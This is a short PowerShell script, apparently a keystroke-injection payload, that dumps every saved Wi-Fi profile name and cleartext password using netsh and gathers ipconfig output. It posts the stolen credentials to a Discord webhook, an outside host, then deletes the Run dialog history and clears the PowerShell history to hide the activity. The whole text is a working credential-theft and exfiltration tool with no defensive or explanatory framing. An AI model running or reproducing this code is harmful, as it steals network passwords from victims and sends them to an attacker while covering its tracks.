$wifiCreds = (netsh wlan show profiles) | Select-String '\:(.+)$'| %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ WIFI_PROFILE_NAME=$name;WIFI_PASSWORD=$pass }}

$wifiCreds = ($wifiCreds | Out-String)
$ipconfig = (ipconfig | Out-String)

#echo $wifiCreds
#$wifiCreds | Out-File .\output.txt

$Body = @{
	'content' = '```'+${wifiCreds}+'```'#+'```'+ ${ipconfig} +'```'
}
	
Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Clear-History
